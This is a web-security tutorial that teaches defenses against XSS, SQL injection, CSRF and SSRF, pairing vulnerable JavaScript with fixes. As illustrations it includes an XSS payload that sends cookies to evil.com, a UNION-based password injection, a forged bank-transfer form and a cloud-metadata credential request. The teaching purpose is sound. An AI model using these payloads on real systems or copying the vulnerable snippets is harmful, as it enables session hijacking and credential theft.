## Why this matters

Every input your application receives — form fields, URL parameters, headers, file uploads, webhook payloads — is a potential attack vector. Cross-site scripting (XSS) alone accounts for roughly a third of all web vulnerabilities reported each year. The defense is not a single check at the front door. It is layers of validation, sanitization, and escaping at every boundary where data flows from untrusted to trusted context.

## Cross-Site Scripting (XSS)

XSS happens when an attacker injects malicious scripts that execute in another user's browser. Three types exist: reflected (in the URL), stored (in the database), and DOM-based (client-side manipulation).

```javascript
// STORED XSS — attacker submits a comment containing a script
// The comment is saved to the database and rendered for all users
const comment =
  "<img src=x onerror=\"document.location='https://evil.com/steal?cookie='+document.cookie\">";

// VULNERABLE — inserting raw HTML into the page
element.innerHTML = comment; // Script executes!

// FIX 1 — use textContent instead of innerHTML
element.textContent = comment; // Renders as visible text, not HTML

// FIX 2 — sanitize HTML when you need to allow some formatting
// Using DOMPurify (a well-tested sanitization library)
const DOMPurify = require("dompurify");
const clean = DOMPurify.sanitize(comment, {
  ALLOWED_TAGS: ["b", "i", "em", "strong", "a"],
  ALLOWED_ATTR: ["href"],
});
element.innerHTML = clean; // Script tags and event handlers stripped

// FIX 3 — Content Security Policy header (defense in depth)
// Prevents inline scripts from executing even if XSS succeeds
// Content-Security-Policy: default-src 'self'; script-src 'self'
```

## SQL Injection

SQL injection lets attackers modify database queries by injecting SQL syntax through user input. Parameterized queries are the primary defense.

```javascript
// VULNERABLE — string interpolation builds the query
async function searchUsers(req, res) {
  const { name } = req.query;
  // Attacker sends: ?name=' UNION SELECT password FROM users --
  const result = await db.query(`SELECT id, name, email FROM users WHERE name LIKE '%${name}%'`);
  res.json(result.rows);
}

// FIXED — parameterized query (the database driver escapes the value)
async function searchUsers(req, res) {
  const { name } = req.query;
  const result = await db.query("SELECT id, name, email FROM users WHERE name LIKE $1", [
    `%${name}%`,
  ]);
  res.json(result.rows);
}

// EVEN BETTER — validate input shape before it reaches the query
const { z } = require("zod");

const SearchSchema = z.object({
  name: z
    .string()
    .min(1)
    .max(100)
    .regex(/^[a-zA-Z0-9\s-]+$/),
});

async function searchUsers(req, res) {
  const parsed = SearchSchema.safeParse(req.query);
  if (!parsed.success) {
    return res.status(400).json({ error: "Invalid search input" });
  }
  const result = await db.query("SELECT id, name, email FROM users WHERE name LIKE $1", [
    `%${parsed.data.name}%`,
  ]);
  res.json(result.rows);
}
```

## Cross-Site Request Forgery (CSRF)

CSRF tricks a user's browser into making requests to your app while they are authenticated. The browser automatically includes cookies, so the server cannot distinguish a legitimate request from a forged one.

```javascript
// The attack: a malicious site includes this form
// <form action="https://bank.com/transfer" method="POST">
//   <input name="to" value="attacker-account" />
//   <input name="amount" value="10000" />
// </form>
// <script>document.forms[0].submit();</script>

// DEFENSE 1 — SameSite cookies (prevents cross-origin cookie sending)
res.cookie("session", token, {
  httpOnly: true,
  secure: true,
  sameSite: "strict", // Cookie not sent on cross-origin requests
});

// DEFENSE 2 — CSRF tokens (defense in depth)
const crypto = require("crypto");

function generateCSRFToken(session) {
  const token = crypto.randomBytes(32).toString("hex");
  session.csrfToken = token;
  return token;
}

function validateCSRFToken(req, res, next) {
  const token = req.headers["x-csrf-token"] || req.body._csrf;
  if (!token || token !== req.session.csrfToken) {
    return res.status(403).json({ error: "Invalid CSRF token" });
  }
  next();
}

// Include the token in forms and AJAX headers
// <input type="hidden" name="_csrf" value="{{csrfToken}}" />
// fetch('/api/transfer', { headers: { 'X-CSRF-Token': csrfToken } })
```

## Server-Side Request Forgery (SSRF)

SSRF tricks the server into making requests to internal resources. Cloud metadata endpoints are a high-value target.

```javascript
// VULNERABLE — server fetches any user-supplied URL
app.post("/fetch-preview", async (req, res) => {
  const response = await fetch(req.body.url);
  const data = await response.text();
  res.json({ preview: data });
});
// Attacker fetches: http://169.254.169.254/latest/meta-data/iam/security-credentials/

// FIXED — validate URL against allowlist and block internal ranges
const { URL } = require("url");
const net = require("net");

function isInternalIP(hostname) {
  // Block private IP ranges, localhost, link-local, metadata endpoints
  const blocked = [
    /^127\./,
    /^10\./,
    /^172\.(1[6-9]|2\d|3[01])\./,
    /^192\.168\./,
    /^169\.254\./,
    /^0\./,
    /^localhost$/i,
    /^::1$/,
    /^\[::1\]$/,
  ];
  return blocked.some((pattern) => pattern.test(hostname));
}

async function safeFetch(urlString) {
  const url = new URL(urlString);

  if (!["http:", "https:"].includes(url.protocol)) {
    throw new Error("Only HTTP(S) URLs are allowed");
  }

  if (isInternalIP(url.hostname)) {
    throw new Error("Internal URLs are not allowed");
  }

  // Resolve DNS to check the actual IP (prevent DNS rebinding)
  const { address } = await require("dns").promises.lookup(url.hostname);
  if (isInternalIP(address)) {
    throw new Error("URL resolves to internal IP");
  }

  return fetch(url.toString(), { redirect: "manual" }); // Prevent redirect to internal
}
```

## Defense in depth — layered validation

No single defense is sufficient. Stack protections at every layer.

```javascript
// Layer 1: Schema validation at the API boundary
const CommentSchema = z.object({
  body: z.string().min(1).max(5000),
  articleId: z.string().uuid(),
});

// Layer 2: Parameterized database queries
async function createComment(data) {
  return db.query("INSERT INTO comments (body, article_id, user_id) VALUES ($1, $2, $3)", [
    data.body,
    data.articleId,
    data.userId,
  ]);
}

// Layer 3: Output encoding when rendering
function renderComment(comment) {
  // Framework handles escaping (React, Next.js do this automatically)
  // If using raw HTML, escape explicitly
  return escapeHtml(comment.body);
}

// Layer 4: Content Security Policy headers
// next.config.ts
const securityHeaders = [
  {
    key: "Content-Security-Policy",
    value:
      "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:",
  },
  { key: "X-Content-Type-Options", value: "nosniff" },
  { key: "X-Frame-Options", value: "DENY" },
  { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
];

// Layer 5: Row Level Security in the database
// Even if application code has a bug, the database blocks unauthorized access
```

## What you learned

- XSS, SQL injection, CSRF, and SSRF each exploit different trust boundaries, and each requires targeted defenses — there is no single fix
- Defense in depth means stacking protections at every layer: schema validation, parameterized queries, output encoding, CSP headers, and database-level policies
- Input validation should happen at the boundary (reject bad data early) and output encoding at the render layer (escape data for its context)
